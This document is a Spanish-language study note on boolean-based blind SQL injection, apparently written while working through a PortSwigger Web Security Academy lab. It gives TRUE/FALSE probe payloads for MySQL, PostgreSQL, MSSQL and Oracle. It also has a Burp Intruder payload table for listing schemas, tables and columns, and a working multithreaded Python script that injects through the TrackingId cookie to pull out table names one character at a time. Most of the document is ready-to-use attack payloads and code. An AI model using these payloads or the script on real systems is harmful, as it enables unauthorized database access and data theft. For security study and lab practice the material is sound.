
---
Tags: #sqli #union #burpsuite

---
#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> No se muestran errores. El atacante modifica la lógica con condiciones booleanas (`TRUE`/`FALSE`) y observa cambios en el comportamiento de la respuesta (contenido, redirección, código HTTP).

---
#### 🧩 Sintaxis por SGBD

|Motor|TRUE|FALSE|
|---|---|---|
|**MySQL**|`' AND 1=1--`|`' AND 1=2--`|
|**PostgreSQL**|`' AND 1=1--`|`' AND 1=2--`|
|**MSSQL**|`' AND 1=1--`|`' AND 1=2--`|
|**Oracle**|`' AND 'a'='a'--`|`' AND 'a'='b'--`|

### Guía de Inyección Blind SQL con Payloads (Cluster Bomb)

| **SGBD**          | **Listar Bases de Datos (Esquemas)**                                                                                                                    | **Listar Tablas (de la DB actual)**                                                                                                                           | **Listar Columnas (de una tabla)**                                                                                                                                           |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PostgreSQL**    | `' AND (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`                                             | `... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §0§) = '§a§'--`                            | `... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`                                         |
| **MySQL**         | `... (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`                                               | `... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §0§) = '§a§'--`                          | `... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`                                         |
| **MS SQL Server** | `... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM master..sysdatabases) t WHERE row=§0§+1) = '§a§'--` | `... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM sysobjects WHERE xtype='U') t WHERE row=§0§+1) = '§a§'--` | `... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM syscolumns WHERE id=OBJECT_ID('usuarios')) t WHERE row=§0§+1) = '§a§'--` |
| **Oracle**        | `... (SELECT SUBSTR(username,§1§,1) FROM (SELECT username, rownum as r FROM all_users) WHERE r=§0§+1) = '§a§'--`                                        | `... (SELECT SUBSTR(table_name,§1§,1) FROM (SELECT table_name, rownum as r FROM all_tables) WHERE r=§0§+1) = '§a§'--`                                         | `... (SELECT SUBSTR(column_name,§1§,1) FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name='USUARIOS') WHERE r=§0§+1) = '§a§'--`                     |

---

> [!example]+  
> 🔍 Prueba de condición
> 
> `' AND SUBSTRING((SELECT user()),1,1) = 'r'--`

---

# Script en python para automatizar el proceso de descubrimiento de BBDD, Tablas, Columnas y Datos en un SQLi a ciegas basada en condicionales booleanos:

```python
import requests

import string

from concurrent.futures import ThreadPoolExecutor

  

# ==========================================================

# CONFIGURACIÓN

# ==========================================================

TARGET_URL = "https://0aa200f1030622d486e3ed4600a900c0.web-security-academy.net/filter?category=Tech+gifts"

TRACKING_ID = "yvEKcnMPOixN5muq"

SESSION_ID = "ih3JmMMmarvDxyo7tAz2cILT64wMi13D"

  

SUCCESS_MARKER = "Welcome back!"

CHARSET = string.ascii_lowercase + string.digits + "_,"

THREADS = 10  # Número de peticiones simultáneas (ajusta según estabilidad)

  

HEADERS = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"

}

# ==========================================================

# LÓGICA MEJORADA

# ==========================================================

def check_char(pos, char, row):

    """Función que realiza una sola petición para un carácter específico."""

    sql_query = f"(SELECT SUBSTRING(table_name,{pos},1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {row}) = '{char}'"

    full_cookie = f"{TRACKING_ID}' AND {sql_query}--"

    cookies = {"TrackingId": full_cookie, "session": SESSION_ID}

    try:

        r = requests.get(TARGET_URL, cookies=cookies, headers=HEADERS, timeout=10)

        if SUCCESS_MARKER in r.text:

            return char

    except:

        pass

    return None


def start_extraction():

    print(f"[*] Iniciando extracción con {THREADS} hilos...")

    for row in range(0, 10): # Iterar sobre tablas

        table_name = ""

        print(f"\n[+] Extrayendo Tabla #{row + 1}:")

        for pos in range(1, 100): # Iterar sobre posición de caracteres

            found_char = None

            # Usamos un pool de hilos para probar el charset en paralelo

            with ThreadPoolExecutor(max_workers=THREADS) as executor:

                # Mapeamos la función check_char a todo el abecedario

                results = list(executor.map(lambda c: check_char(pos, c, row), CHARSET))

                # Buscamos si alguno de los hilos devolvió el carácter correcto

                for res in results:

                    if res:

                        found_char = res

                        break

            if found_char:

                table_name += found_char

                print(f"    -> {table_name}", end="\r")

            else:

                # Si no hay carácter en esta posición, la tabla terminó

                break

        if not table_name:

            print("[*] No se encontraron más tablas.")

            break

        print(f"\n[!] Tabla encontrada: {table_name}")

  
if __name__ == "__main__":

    start_extraction()
```

---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)